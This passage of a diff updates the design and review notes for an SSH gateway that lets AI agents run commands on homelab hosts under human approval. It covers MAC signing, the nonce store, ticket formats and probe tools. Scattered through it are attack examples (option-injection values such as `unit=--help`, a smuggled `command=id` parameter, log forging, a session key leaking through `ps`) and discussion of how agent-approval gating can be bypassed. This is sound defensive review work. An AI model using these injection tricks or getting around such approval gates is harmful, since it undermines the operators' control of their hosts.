+  Add one option for the security reviewer to decide: a per-gateway "never
+  accept the dashboard key" switch (the installer omits the line).
+
+**Design round 3 (2026-11-09, main feature reviewer): feature side approved;
+to the security reviewer.** A1–A5 are complete and specific. I recomputed the
+shared test vector independently (command hash, derived key and signature)
+and all three match. Two small points to apply in the code, with no need for
+another design round:
+
+* **N1** `consume_nonce` checks `"$ts $nonce"`. Check the **nonce alone**,
+  so a repeated nonce is refused whatever timestamp it comes with. The MAC
+  already binds the timestamp, but the store should not depend on that.
+* **N2** The envelope prints `request_id` from `DISPLAY_ID`, which is
+  zero-padded (`000123`) and is not a valid JSON number. Use
+  `REQUEST_ID_INT`. Add it to the envelope test.
+
+**For the security reviewer:**
+
+1. The key derivation (§5, A2).
+2. The nonce store failing closed (A1).
+3. The ticket compatibility rules (A4).
+4. The accepted risk in §12 (A5): with the dashboard key, the dashboard can
+   start commands as well as approve them. Decide whether the per-gateway
+   "never accept the dashboard key" switch is in scope.
+5. The note moves the existing `ESHU_SESSION_SIG` key-on-argv to Chunk 7.
+
+#### Security reviewer sign-off
+
+**2026-11-09: design approved on conditions (security chat, reviewed at
+`3a286cb`).** This was a design and code-text review of the note and the
+bash it shows, checked against `eshu-gateway.sh` and `db/gateways.py`.
+Nothing was run. Write conditions G1–G8 into the note before any code. The
+gateway bash (prefix parsing, nonce store, ticket parsing, `say()` and the
+envelope) then comes back to the security chat as a code review before
+merge.
+
+**What holds:**
+
+* The MAC covers every prefix field, the command hash and the gateway
+  identity, in a versioned canonical form that cannot contain a newline.
+  That is the right shape, and it is also the model for Chunk 6's binding
+  of the session signature to the command.
+* Force-JIT is enforced on both sides, and the dashboard re-derives it from
+  the agent's policy. A dashboard bug can only add gating.
+* Host keys are pinned from the token-authenticated registration, and a
+  changed key is never re-pinned silently.
+* The envelope is the only stdout, with all output base64-encoded inside it,
+  so a command cannot forge a status.
+* The key never goes on argv for the new helper. Signatures and nonces are
+  never logged.
+
+**Conditions:**
+
+* **G1: the dashboard signs with the derived key, not the token.** Today the
+  dashboard stores gateway tokens in plain text. Chunk 7 will store only a
+  hash of them, and after that the dashboard cannot compute `K` from the
+  token. Rule: compute `K` when a token is set or rotated, store it in its
+  own column, and sign with that column. `K` never appears in logs or in any
+  API response.
+* **G2: the gateway refuses half-signed and ambiguous prefixes.**
+  * If any of `ESHU_AGENT`, `ESHU_AGENT_SIG`, `ESHU_TS`, `ESHU_NONCE`,
+    `ESHU_MCP` or `ESHU_FORCE_JIT` is present without a valid signature, the
+    gateway refuses the request in every `ssh_mode`, rather than ignoring
+    the fields. Otherwise an unsigned agent name could reach attribution.
+  * A prefix key that appears twice is refused. Today the parse loop keeps
+    the last value it sees.
+  * `ssh_exec` refuses a command whose first word starts with `ESHU_`.
+  * §5 writes `ESHU_SESSION=` in the prefix but `ESHU_SESSION_ID` in the
+    canonical form. Use `ESHU_SESSION_ID` throughout.
+  * State how strict sessions apply. The valid agent MAC covers the session
+    id, so the gateway may accept it *in place of* `ESHU_SESSION_SIG`, but
+    only when the MAC is valid.
+* **G3: hash exactly the bytes the gateway will run.** The gateway trims
+  whitespace before the command reaches the hash, and Python's `strip()` is
+  not the same trim (the F3 SR1 lesson). Rule: `ssh_exec` refuses a command
+  with leading or trailing whitespace or any control character other than
+  tab and newline, instead of hashing something the gateway will change.
+* **G4: the nonce store, in four fixes:**
+  * (a) N1: check the nonce on its own.
+  * (b) Never truncate the store in place. If the write after
+    `cat … > nonces` fails, it leaves an empty store, and the *next* call
+    accepts replays. Use a separate lock file, write the pruned list plus
+    the new nonce to a temp file, and rename it into place.
+  * (c) Check the timestamp and the MAC first, and write the nonce only
+    after both pass. Otherwise unsigned garbage from a shared-key caller can
+    fill the 4096-entry bound and lock out every signed call for five
+    minutes.
+  * (d) Keep the store across restarts. `/run` is cleared on reboot, and a
+    container restarts in seconds, well inside the ±300 s window. Put the
+    store in a persistent, root-only `0700` directory such as
+    `/var/lib/eshu/`, and refuse the call if the store is missing and cannot
+    be created.
+
+  Tests: a failed write leaves the previous store intact; a call with a bad
+  MAC adds no entry; and a replay after the store's directory is recreated
+  is still refused.
+* **G5: version the ticket line, and require the new poller.**
+  * Detecting the format by counting `|` is ambiguous. An old `ts|cmd` line
+    whose command is a pipeline whose first words look like an agent and a
+    session would parse as a ticket bound to that agent, for a shorter
+    command than the one the human approved.
+  * Rule: new lines start with a fixed tag (`v2|ts|agent|session|cmd`). A
+    line without the tag is old: everything after the first `|` is the
+    command, and the ticket is agent-less.
+  * The capability check in §9 must also cover the poller's ticket format.
+    Otherwise, on a gateway with an old poller, an MCP agent loops through
+    pending, approve and refused for ever.
+  * Test: an old line whose command looks like `agent|session|…` stays
+    agent-less, and only an unsigned request for the *whole* command can
+    claim it.
+* **G6: a call on the dashboard key must be signed.** Give the dashboard
+  line a forced command with a fixed marker argument, for example
+  `… eshu-gateway.sh --dashboard-key`, and allow exactly that argument in
+  sudoers. The gateway then refuses any call that arrives on the dashboard
+  key without a valid signature, in every `ssh_mode`. A leaked key file
+  without the derived keys then runs nothing. Callers on the shared key
+  cannot set the marker, because sshd sets it.
+* **G7: harden the runner.**
+  * Connect to the registered IP and never resolve the hostname.
+  * Pass `-F /dev/null`, so no user or system `ssh_config` applies (no
+    `ProxyCommand`, no `Match`).
+  * Use `UserKnownHostsFile=<pin file>` and `GlobalKnownHostsFile=/dev/null`.
+  * The UI warns when `ALLOWED_SSH_FROM` on a gateway covers more than the
+    dashboard's own address.
+* **G8: one logging rule for every prefix.** The gateway logs the command
+  only after *all* prefixes are stripped, `ESHU_SESSION_SIG` included. This
+  delivers the Chunk 7 "stop logging the session signature" item as part of
+  F12. That's fine, but the item stays open in Chunk 7 until whichever
+  ships first is merged and deployed.
+
+**Answers to the five questions:**
+
+1. **Key derivation: acceptable.** HMAC keyed with the token over a fixed
+   label is a sound one-step key derivation. It keeps the MAC key separate
+   from the token's role as a bearer credential, and rotating the token
+   rotates the key. Anyone who holds the token can forge an agent identity,
+   but only on that one gateway, because the gateway's identity is in the
+   MAC. Holding the token already means root on that gateway, so this adds
+   nothing. Condition: G1.
+2. **Nonce store: not yet.** The intent is right: everything happens under
+   one lock, the bound fails closed, and errors refuse the call. But three
+   paths let replays back in or lock out legitimate calls: the in-place
+   truncate, writing the nonce before the MAC is checked, and the store
+   being cleared on reboot. It fails closed once G4 is in.
+3. **Ticket compatibility: sound rules, ambiguous format.** These rules are
+   correct: a signed request claims only its own agent's ticket, and an
+   unsigned request claims only an agent-less one. Fix the format detection
+   and the poller check with G5.
+4. **The accepted risk in §12: accepted. The "never accept the dashboard
+   key" switch is not required in F12.** A compromised dashboard already
+   controls the fleet, because it serves the installer, the feature scripts
+   and the fleet runner, which run as root on every gateway (the Chunk 6
+   threat). A switch enforced by an installer that the dashboard itself
+   serves cannot stop a compromised dashboard. The switch only means
+   something once gateways verify scripts against a key the dashboard does
+   not hold, so design it in Chunk 6. The realistic risk F12 adds is a
+   leaked key file, and G6 covers it.
+5. **`ESHU_SESSION_SIG`'s key off argv: yes, in Chunk 7, but it is more
+   than a cleanup.** While the helper runs, the fleet-wide session key is
+   visible in `ps` and `/proc/<pid>/cmdline`. F4's read lane allows
+   `ps aux` with no human approving it. Make it a third precondition for
+   unlocking F4's `on` mode, next to the logging and binding items.
+
+**Verdict:** design approved once G1–G8 are written into the note. The
+feature reviewer checks the dashboard side of the code. The gateway bash
+comes back to the security chat before merge.
+
+**Code round 1 (2026-11-09, main feature reviewer): changes requested.**
+I ran 278 F12, gateway-script, installer, poller and golden tests locally;
+the implementer's full gate passed 2462.
+
+*What holds in the gateway bash (`aa268de`):*
+
+* **Prefix parsing:** keys are allowlisted, duplicate and half-signed
+  prefixes are refused, and `printf -v` only touches listed names.
+* **Signature:** `ts` and the MAC are checked **before** the nonce is
+  consumed. The nonce store uses a separate lock file, a temp file plus
+  rename, and fails closed on any error.
+* **Dashboard key:** `--dashboard-key` is set only by the forced command
+  (the forced command, not sudoers, blocks extra arguments; see the security reviewer's S3), and calls on it must be signed.
+* **Logging:** one log line, after every prefix is stripped, with no
+  prefix values.
+* **MCP mode:** `say()`/`finish()` make stdout exactly one envelope, and
+  `tee >/dev/null` keeps the stream off it.
+* **Force-JIT:** the allowlist, the regex allowlist and the feature
+  scripts are all skipped under force-JIT.
+* **Tickets:** `ticket_allowed` binds the claim to the agent and session.
+* **Poller:** it understands v2 lines when pruning.
+
+*Dashboard:* the runner argv is fixed (`-F /dev/null`, the IP only,
+`StrictHostKeyChecking=yes`, a per-gateway known_hosts file, process-group
+kill). Session ownership fails closed. `read_only` refuses. The derived key
+is stored (G1). G3 whitespace and control-character refusal is in.
+
+*Must fix:*
+
+* **M1 Old gateways break on the first dashboard deploy.** `ticket_line()`
+  now always returns `v2|ts|agent|session|cmd`, from both
+  `update_ticket_consumed_by_ip` (the poller) and `get_ticket_by_request_id`
+  (the gateway's JIT claim), whoever asks.
+  * An **old gateway's** JIT claim takes `split("|",1)[1]` (`<ts>|…|cmd`),
+    which never equals `cmd`. The result is "Approved command does not
+    match" on **every** approval.
+  * An **old poller** prunes on `$1+90`, so every v2 line is deleted as
+    stale.
+
+  The rollout is "dashboard first, gateways later", so this breaks every
+  approval fleet-wide until each gateway updates. Fix: emit
+  `v2|…` **only** to a gateway whose stored `ssh_ticket_format == 'v2'`,
+  and the old `ts|cmd` otherwise. A row that has an `agent` must never be
+  issued in the old format: refuse it and audit, since `ssh_exec` already
+  refuses gateways without the capability. Tests: an old-format gateway
+  gets `ts|cmd` from both call sites; a v2 gateway gets v2; an agent row on
+  an old gateway is refused.
+* **M2 The approval race on re-run.** After approval, `ssh_exec(wait=true)`
+  re-runs as soon as the row is `approved`. But the ticket reaches the
+  lockbox only when the poller next calls `/api/poll`, which also flips the
+  row to `consumed`. A re-run that lands first finds no ticket, so the
+  gateway files a **second** JIT request. The operator is asked twice, and
+  the first ticket expires unused. Agents that poll `check_request` and call
+  again hit the same race.
+  * Minimal fix: `wait` re-runs only once the row is `consumed`, which
+    means the poller has taken the ticket.
+  * `check_request` tells MCP agents "ready to re-run" only at `consumed`,
+    and `approved` reads as "approved, delivering to the gateway".
+  * Test with a simulated poller lag: no second request is created.
+
+  (A deterministic alternative is a MAC-covered `ESHU_REQUEST_ID` that lets
+  the MCP re-run claim through `/api/ticket/{id}`. It is cleaner but a
+  design change, so only take it if the minimal fix proves flaky.)
+* **M3 The force-JIT re-derivation fails open.** In `receive_request`,
+  when the gateway sends `force_jit=false` with an agent:
+  * an unknown agent leaves `force_jit=False`;
+  * an exception sets it `False`;
+  * an agent whose `ssh_mode` is unset gets `False`, while `ssh_exec`
+    treats unset as `approval`.
+
+  Make it fail closed: unknown agent → force; exception → force; unset
+  mode → `approval` (one shared default constant used by both places).
+  Tests for each.
+
+*Should fix / answers to the open questions:*
+
+* **S1** Report `ssh_agent_format` only when `/etc/eshu-token` exists. A
+  gateway updated by self-update without a re-install has no token file;
+  today every signed call there fails as `bad signature`, which is safe
+  but confusing.
+* **S2** In `PREFIX REFUSED` log lines, log `agent=` only when it passed
+  its charset check, so nothing arbitrary reaches syslog.
+* **Open question 1 (capture `off`):** honour the operator's setting. The
+  agent still gets its output in the envelope, but `request_results`
+  stores the exit code and duration only.
+* **Open question 2 (`ALLOWED_SSH_FROM`):** the installer warns when it
+  falls back. The gateway's detail view shows the `from=` addresses the key
+  line was written with.
+
+The gateway bash is with the security reviewer (their code review is
+separate). M1 is the one item they may also flag.
+
+**Code review of the gateway bash (aa268de, notes cfe8db0), 2026-11-09:
+changes requested (R1–R4).** I read `eshu-gateway.sh`, `eshu-poller.sh`,
+the installer template and the `ssh_exec` runner argv. I did not run anything.
+
+*Must fix before merge:*
+
+* **R1. Anyone on the gateway host can read the token, and with F12 the token
+  signs requests.** The installer leaves `/usr/local/bin/eshu-gateway.sh`
+  mode 0755 with `GATEWAY_TOKEN` written into it (true since v0.1.0). Before
+  F12 this let a local user call the dashboard as the gateway. Now the
+  signing key is derived from the token, so the same user can sign requests
+  as any agent: take another agent's approved ticket, vouch for any session
+  on a gateway that requires sessions, and pass `mcp_only`. The new 0600
+  `/etc/eshu-token` protects nothing while a copy sits in a world-readable
+  file.
+  - Fix: install the gateway script 0700 root:root in every installer mode
+    (install, reinstall and update). sudo runs it as root, and the poller is
+    already 0700.
+  - Write `/etc/eshu-token` with `umask 077`, so the temp file is never
+    readable, not even for the moment before `chmod`. That applies to the
+    installer and to both poller token-rotation paths.
+  - Test: an installer sandbox run in each mode leaves the script at 0700
+    and the token file at 0600. The token write runs under umask 077 in the
+    installer and in the poller.
+* **R2. The refusal log line records the unverified agent name.** Line 499
+  logs `agent=${ESHU_AGENT}`, even when that value failed its character
+  check, so raw bytes from the caller reach syslog. A newline in that value
+  can forge a log line. G8 says no prefix value is logged.
+  - Fix: log only the verified agent, or `none`.
+  - Test: an agent value containing a control character is refused, and
+    nothing from it appears in the logger output.
+* **R3. The gateway does not refuse a command whose first word still starts
+  with `ESHU_` after the prefixes are stripped (G2).** The dashboard refuses
+  these for signed calls, but callers on the shared key reach the gateway
+  directly. An unknown `ESHU_` key currently ends prefix parsing and becomes
+  part of the command.
+  - Fix: after the parse loop, refuse when the first word starts with
+    `ESHU_`.
+  - Test, in direct and MCP mode: an unknown key is refused, and so is a
+    known key placed after an unknown one.
+* **R4. In MCP mode, output is stored when capture is set to `exit-only`.**
+  This answers open question 1. The operator's capture setting wins:
+  - `off`: no result row. Line 222 already does this, so the implementation
+    note's description is wrong.
+  - `exit-only`: the exit code only.
+  - `tail`: the tail.
+
+  The agent already has the bytes from the envelope. Being more auditable
+  does not justify overriding an operator's explicit choice to keep output
+  off the dashboard (§2.5).
+  - Fix: at line 228, drop the `-n "$ESHU_MCP_CAP"` alternative.
+  - Test: an MCP run with `exit-only` capture posts an empty
+    `encoded_output`.
+
+*Where this meets the feature reviewer's code round 1:* their M1 (the
+ticket format sent to old gateways) is a correct finding, and I agree with
+it. R2 is their S2, made a must-fix. R4 is the same answer as theirs to open
+question 1. One correction to their notes: the sudoers line does not
+restrict the arguments (see S3); forced commands do.
+
+*Should fix (may follow in a later chunk):*
+
+* **S1. `ESHU_WINDOW_TOKEN` and `ESHU_EXECUTION_ID` are outside the MAC.**
+  The dashboard never sends them on a signed call, so refuse them in a
+  signed prefix. This also keeps the window script's direct `echo` from
+  breaking an MCP envelope. Test: a signed prefix carrying a window token is
+  refused.
+* **S2. The nonce store is not on the self-protection list.** Add
+  `/var/lib/eshu` to the hard-coded list. Deleting the store would reopen
+  the 300-second replay window. Test: a command naming that path is refused
+  as FATAL.
+* **S3. The sudoers line allows extra arguments.** It names the gateway
+  script with no arguments, and in sudoers that means any arguments. Write
+  `/usr/local/bin/eshu-gateway.sh ""` instead. Forced commands block extra
+  arguments today, so this is defence in depth.
+* **S4 (dashboard side, for the feature reviewer).** Check the gateway IP
+  with a strict IP pattern just before `build_argv`, so the host argument
+  can never start with `-`.
+
+*Checked and fine:*
+
+* **Prefix parsing (G2):**
+  - Duplicate keys are refused.
+  - Any one of the six identity keys requires the full signed set, in every
+    `ssh_mode`.
+  - The MAC helper reads the key from `/etc/eshu-token`, takes the canonical
+    form on stdin and compares in constant time. Only the signature is on
+    argv.
+  - The canonical form hashes the trimmed command. That is also the exact
+    command that runs, and the dashboard refuses surrounding whitespace, so
+    the binding holds (G3).
+* **The nonce store (G4):**
+  - The nonce is checked alone.
+  - A separate lock file, a temp file and a rename; the store is never
+    truncated in place.
+  - The nonce is written only after the timestamp and the MAC pass.
+  - The store is in `/var/lib/eshu`, a 0700 directory.
+  - Pruning by the signed timestamp matches the ±300 s window.
+  - The environment overrides are scrubbed before use.
+* **Ticket v2 (G5):**
+  - The tag is parsed on all three paths: the lockbox claim, the
+    consumed-ticket claim and the `/api/ticket` claim.
+  - A signed call takes only its own agent's ticket, and only its own
+    session's ticket when it names a session. An unsigned call takes only an
+    agent-less ticket.
+  - The poller prunes v2 lines by their own timestamp field.
+* **The dashboard key (G6):** an unsigned call arriving on it is refused in
+  every mode. `mcp_only` refuses unsigned calls, and the installer drops the
+  shared-key line.
+* **Envelope-only stdout:**
+  - One `say()` writer, and every MCP exit path goes through `finish`.
+  - `tee` writes to `/dev/null`.
+  - The dashboard parser requires exactly one line. A command that writes to
+    the gateway's own stdout, for example through `/proc`, gets
+    `bad-envelope`, which fails closed.
+* **Logging (G8):** the main line logs only the stripped command. Both
+  heredoc fixes in round 6 are correct.
+* **The runner (G7):** the argv carries `-F /dev/null`, the pinned
+  `UserKnownHostsFile` and `GlobalKnownHostsFile=/dev/null`.
+* **Open question 2:** the installer warning about `ALLOWED_SSH_FROM` is
+  enough for G7. The UI follow-up is optional.
+* **A re-register from an old installer clears the capability fields.**
+  Agreed: that fails closed.
+
+**Verdict:** changes requested. Once R1–R4 are fixed with their tests, I
+review only that diff, not the whole bash again. F12 must not merge before
+then.
+
+**Code round 2 (feature reviewer, 2026-11-10, `c137e55`): approved, pending
+merge-forward and the security diff check.**
+
+* **The fixes:** M1–M3 and S1–S2 are fixed as asked, and so are the security
+  reviewer's R1–R4 and S1–S4.
+  * The dashboard sends the old `ts|cmd` line to a gateway that has not
+    reported v2, and denies an agent row there, with an audit record.
+  * `wait` re-runs only at `consumed`.
+  * Force-JIT fails closed through one shared constant.
+* **Tests:** 296 F12, installer, gateway-script and session tests pass
+  locally. The implementer's full run is 2484.
+* **Residual race (should, not blocking):** `consumed` is written when the
+  poller *fetches* the ticket, a moment before it writes the lockbox line. A
+  re-run that lands in that gap still files a second request. The window is
+  milliseconds against a 2 s poll interval, so it is rare. If it shows up,
+  `ssh_exec` can wait one more poll interval after seeing `consumed`.
+* **The order from here:**
+  1. `fix/ci-environment` merges first; it is the release blocker.
+  2. This branch is merged forward onto the updated `feature-roadmap`. It
+     conflicts with the CI fix in `eshu-gateway.sh`, both installers and
+     `tests/test_gateway_script.py`: both rewrite the capture code. Keep the
+     CI fix's `capture_tail`/`PIPESTATUS` code and F12's R4 rule in
+     `post_exec_result`, then regenerate the installers.
+  3. The security reviewer checks the merged-forward `eshu-gateway.sh`,
+     installer-template and poller diff once, against `feature-roadmap`.
+  4. Then I merge.
+
+**Merge-forward review (feature reviewer, 2026-11-10, `bb12b76`): approved.**
+CI is green. The MCP branch is `… | sanitize | capture_tail "$ESHU_MCP_CAP"
+65537 >/dev/null`: one ring, no FIFO, no wait; `capture_tail` takes the cap as
+`$2` with `cap + 2` slots and the C5 `delete`s; the envelope reads the last
+65 536 bytes and the +1 tells "cut". Its output goes to `/dev/null`, so mawk's
+input buffering (see the buffering-fix note) does not matter on this path.
+
+* **Correction to the report:** B1 is **not** on this branch. It is only on
+  `fix/stream-unbuffered`, which has not merged; `sanitize` here is still plain
+  `sed -E`. After that fix merges, merge `feature-roadmap` forward once more
+  (expect a small conflict at `sanitize`; take the `SANITIZE_CMD` form), then
+  the security reviewer re-checks the merged gateway diff, then I merge F12.
+
+**Second merge-forward (feature reviewer, 2026-11-10, `8534f58`): approved; to
+the security reviewer for the merged gateway diff.** CI is green. `sanitize`
+is the roadmap's `"${SANITIZE_CMD[@]}"` form (`stdbuf -oL sed -E`, plain
+`sed` plus one syslog line as fallback). The MCP branch is still
+`capture_tail "$ESHU_MCP_CAP" 65537 >/dev/null`. Both installers embed both.
+After the security check, I merge F12 into `feature-roadmap`.
+
+**Security reviewer — merged gateway diff (2026-11-10, `61ad819`, read
+against `feature-roadmap`): approved. F12 may merge.** I read
+`dashboard/eshu-gateway.sh`, its copy embedded in both installers (identical
+to the script), the installer's file modes, the sudoers line and the key
+lines, and the S4 check in `core/ssh_exec.py`.
+
+* **The buffering fix merge is right.**
+  * `sanitize` is the roadmap's `SANITIZE_CMD` form, with the redaction rules
+    unchanged.
+  * MCP mode keeps `capture_tail "$ESHU_MCP_CAP" 65537 >/dev/null`. The ring
+    has `cap + 2` slots, so a live line is never overwritten.
+  * The F5 tail in MCP mode comes from the same capture, and R4's
+    `exit-only` rule applies to it.
+* **R1–R4 and S1–S4 are all in:**
+  * R1: the script is installed `0700` and owned by root, and every write of
+    `/etc/eshu-token` is a temp file under `umask 077`, then `chmod 600`,
+    then a rename.
+  * R2: only the verified agent name is logged.
+  * R3: a leftover `ESHU_` first word is refused, including a known key
+    placed after an unknown one.
+  * R4 is done.
+  * S1: a signed prefix carrying `ESHU_WINDOW_TOKEN` or `ESHU_EXECUTION_ID`
+    is refused.
+  * S2: `/var/lib/eshu` is on the self-protection list.
+  * S3: the sudoers line allows exactly `""` and `--dashboard-key`.
+  * S4: `IP_RE` is checked right before `run_ssh`.
+* **The rest of the gate holds:**
+  * prefix keys are an allowlist, a duplicate is refused, and the charsets
+    are checked before the MAC;
+  * the nonce is written only after the timestamp and MAC pass, through a
+    temp file and a rename under a separate lock;
+  * the dashboard key always requires a signature, and `mcp_only` refuses an
+    unsigned call;
+  * force-JIT skips the exact list, the regex list and the feature scripts;
+  * a `v2` ticket is claimable only by its own agent and session, and an old
+    line is agent-less, both in the lockbox claim and in the poll-claim path;
+  * every exit in MCP mode goes through `finish`, and no bare `echo` is left
+    after the prefix parse;
+  * the window script prints with `echo`, but it only runs with a window
+    token, which a signed prefix cannot carry. So it cannot write raw output
+    into an MCP envelope.
+* **Notes, not blocking:**
+  * **N-a:** run the two inline Pythons (the MAC check and the session
+    signature check) as `python3 -I`, so neither the working directory nor
+    the environment can put a module ahead of `hmac` or `hashlib`. Sudo
+    already resets the environment, so this is a small hardening step.
+    Do it on the next gateway-bash branch.
+  * **N-b:** `dashboard/static/dev/eshu-gateway-install.sh` has no F12 code
+    (last changed before F5). If anything still serves it, regenerate it or
+    remove it. A gateway installed from it would not enforce `mcp_only`.
+  * **For the record:** in MCP mode nothing sees a client disconnect,
+    because the output goes to `/dev/null`. The dashboard's timeout ends the
+    wait, not the command. That is still accepted with F19 as the bound for
+    unattended runs, as recorded in the F19 review.
+
 
 ---
 
@@ -4965,9 +7863,50 @@ Follow-ups (S, non-blocking):
   text is effectively an instruction to them. The operator's Confirm is the
   only gate; say so in the review UI ("agents will follow this").
 
+### Round 2 — the reviewer follow-ups S1–S3
+
+Three small changes, each with its test; no schema change and no new tool.
+
+* **S1 — ownership fails closed.** `validate_payload` refused only when the
+  session had an owner and it differed, so an ownerless session accepted a
+  draft from any agent. It now refuses **whenever there is no owner** or the
+  owner differs (`session_not_yours`), matching F3's SR2 rule: a conclusion is
+  read by other agents later, so no one may write one into a session that has
+  nobody to vouch for the caller. The old "an adopted chat id stays usable"
+  rule is retired. Test: `test_f13_ownerless_session_is_refused_closed`, both
+  through `save_conclusion` and through `session_conclude`.
+* **S2 — runbook search matches per term.** `search_runbooks` compared the
+  whole query as one `LIKE '%…%'` over four columns, so "nginx 502" only
+  matched a runbook that contained that exact phrase in one field. The query
+  is split on whitespace (at most 8 terms, `MAX_TERMS`) and every term must
+  match at least one of title / when-to-use / tags / summary — an `AND` of
+  per-term `OR`s, still parameterised. Test:
+  `test_f13_runbook_search_matches_each_term` (terms across fields, an
+  unmatched term excludes, spacing/order/duplicates are harmless).
+* **S3 — the Confirm button says what it does.** The draft card now shows
+  "Agents will follow this once confirmed." next to Confirm
+  (`.cc-hint`, muted, 11 px). A confirmed card does not repeat it. Test: the
+  node harness asserts the hint is in the draft markup and not in the
+  confirmed one.
+
+`bash scripts/verify.sh`: `2333 passed, 7 warnings in 445.03s (0:07:25)`.
+
+**Follow-ups review (2026-11-09): approved and merged.** S1 fails closed for
+ownerless sessions, tested through the core call and the MCP tool. S2's
+per-term `LIKE`s stay parameterised and capped at 8. S3 uses existing tokens
+(`--text-micro`, `--text-quiet`). A user's `%` or `_` in a search term still
+acts as a `LIKE` wildcard. That is harmless (it only widens a search of
+confirmed runbooks), and it is left as it is.
+
 ---
 
-## Chunks F14–F17 — Local-model support
+## Chunks F14–F17 — Structured tools (all agents) and local-model support
+
+**Re-scoped 2026-11-10.** F14–F16 are main-line work, not only local-model
+support: probes and recipes cut approval prompts for every agent, Hermes
+included, because free-form read shell rarely fits the read lane. They are
+ordered with the main line in § 9. Only F17 (and the parked F20) is the
+local-model experiment, and it goes last.
 
 Goal: let a small local model (e.g. a 14–20B model in LM Studio on a 16 GB GPU)
 handle routine homelab support by moving the intelligence to **authoring time**:
@@ -5288,11 +8227,361 @@ F12 (runner), F4 (read lane), F5 (outputs), F3 (grouped approval), F14 (for
 
 ### Implementer notes
 
-_(implementer)_
+**Code round 1 (2026-11-10) — `dashboard/core/probes.py`, five MCP tools,
+`tests/test_f15_probes.py` (43 tests).** Probes are code: typed parameters in,
+a fixed command list out, a capped digest back.
+
+**The probes and their commands.** `diagnose_service`:
+`systemctl is-active --no-pager <unit>`, `journalctl -u <unit> -n 200
+--no-pager -o short-iso`, `ss -tlnp`. `diagnose_container`: `docker ps -a
+--no-trunc` + `docker inspect <name>`, or `pct list` + `pct config <vmid>`.
+`disk_pressure`: `df -h`, `df -i`, `du -x -d 1 /var/log`. `dns_check`: the
+Pi-hole record only (P8's "else none").
+**P1** is a per-type first-character rule: `unit` `^[A-Za-z0-9][A-Za-z0-9@._-]
+{0,127}$`, a Docker name `^[A-Za-z0-9][A-Za-z0-9_.-]{0,127}$` or a vmid
+`^[0-9]{3,9}$`, an FQDN of lower-cased RFC labels with no `..` and no leading
+dash, and `host` must be a registered gateway IP. Every value is
+`shlex.quote`d, and unknown parameters are refused (`command=id` cannot ride
+along). **P2:** state comes from `systemctl is-active` (a structured word,
+never prose); `systemctl status` is not used at all. **P5:** each output goes
+through `core.secret_scrub.scrub_string` before parsing (test: a synthetic
+`API_KEY` value never reaches the digest). **P6:** the `du` is
+`-x -d 1 /var/log`. **P7:** the digest is capped at 8,000 bytes of
+`json.dumps`, `truncated` is set, and the drop order is errors past the top 10
+first, then ports, then the log/ps lists. **P8:** `dns_check` reports
+`gateway: null` and why, and the agent cannot name a host.
+
+**P3 — no capture dependency.** The digest is built from the F12 envelope's
+output, which the runner returns whatever `/etc/eshu-capture` says, so a
+gateway on `exit-only` still yields a digest. There is no silent empty digest:
+a command that did not run lands in `incomplete` with its reason.
+
+**P4 — one grouped approval.** `diagnose_*` validates, builds the commands,
+and proposes **one** F3 plan (the probe's own code, not agent text) with one
+item per command; the call returns `{status: pending, plan_id}` and creates no
+JIT requests (test). `probe_result(plan_id)` returns `pending` until the
+operator approves; then it runs each command through the F12 runner (the
+approved plan claims them), builds the digest, stores it, and returns it. A
+second `probe_result` returns the stored digest without re-running (test).
+The agent cannot approve a plan.
+
+**Deviation, for the reviewer — probes do not use F4's read lane.** The
+outline says every generated command must pass `read_policy.is_read_ssh`, and
+P2 says to use `systemctl show`. Those conflict: `read_policy` deliberately
+refuses `systemctl show`, `docker logs`, `pct status` and `getent` (its
+`probe class` tests pin `systemctl show nginx` as ineligible), and extending
+the lane is its own reviewed surface. So probes rely on the **grouped
+approval** instead of auto-run: the operator approves the exact commands,
+which is stronger than lane eligibility, and no agent text reaches a shell
+either way. If the reviewer prefers `active_since`/`NRestarts` in the digest,
+it needs `systemctl show` in the lane (a separate change); the digest
+currently carries `state`, `errors`, `ports` and `error_total`.
+
+`bash scripts/verify.sh`: `2685 passed, 22 skipped, 7 warnings in 535.07s (0:08:55)`.
 
 ### Reviewer notes
 
-_(reviewer)_
+**Pre-implementation notes (2026-11-09).** The outline is sound. Close these
+points in the implementation; each needs a test. F15 starts after F12 is
+merged.
+
+* **P1 (must): no option injection through a parameter.** `shlex.quote`
+  stops shell syntax but not a value starting with `-`. `unit=--help` or
+  `container=-v` is one quoted word that `systemctl` or `docker` still reads
+  as an option. Every type's first character must be alphanumeric:
+  * `unit` `^[A-Za-z0-9][A-Za-z0-9@._-]{0,127}$`;
+  * `container` is a Docker name `^[A-Za-z0-9][A-Za-z0-9_.-]{0,127}$`, or a
+    vmid `^[0-9]{3,9}$`;
+  * `name` uses the F16 `fqdn` rule (labels of at most 63 characters, no
+    leading `-`, no `..`).
+  
+  Also put `--` before the operand wherever the tool accepts it.
+* **P2 (must): structured sources over parsing prose.** Take state from
+  `systemctl show -p ActiveState,SubState,ActiveEnterTimestamp,NRestarts
+  -- <unit>`, not by parsing `systemctl status`. NRestarts is the restart
+  count. Keep `status` out of the probe entirely, or use it for display only.
+* **P3 (must): say what happens without output capture.** The digest needs F5
+  `tail` output, and every live gateway is on `exit-only`. Pick one:
+  * the probe refuses with `capture_off` and a hint; or
+  * F12's per-request capture override applies to probe requests (only if
+    the F12 R4 rules allow it).
+  
+  Never return an empty digest as if all is well.
+* **P4 (must): don't block the MCP call.** Without F4 `on` (and `on` is
+  locked), every probe waits for approval. `diagnose_*` returns
+  `{status: "pending", plan_id}`, and `probe_result(plan_id)` returns the
+  digest when it is ready. The plan is proposed by the probe's code, not by
+  agent text, and an agent cannot approve it.
+* **P5 (must): scrub before the digest.** `docker logs` and `journalctl`
+  lines can carry tokens. Run the F5 scrubber over each output before
+  parsing, and test that a synthetic token in a log line never reaches the
+  digest.
+* **P6 (should): bounded commands.** `du` over `/var/log` can be slow on a
+  big host. Use `du -x -d 1 -- /var/log`, and rely on F19's time limit once
+  it lands. Until then, document that a probe can take as long as its
+  slowest command.
+* **P7 (should): make the cap testable.** "2,000 tokens" should be a byte or
+  character cap (for example 8,000 characters of JSON), with `truncated: true`
+  and the order things are dropped in (errors beyond the top 10 first, then
+  ports).
+* **P8 (should):** `dns_check` must say which gateway it uses: the one F14's
+  inventory maps the NPM proxy host to, else none (Pi-hole only). Never let
+  the agent name it.
+
+**Code round 1 (feature reviewer, 2026-11-10, at `5eeb5f6`): changes requested, AG1–AG7.**
+
+The typed parameters (P1), the quoting, the cap with its drop order (P7), the
+`du -x -d 1` bound (P6) and the one-plan proposal (P4) are right. The
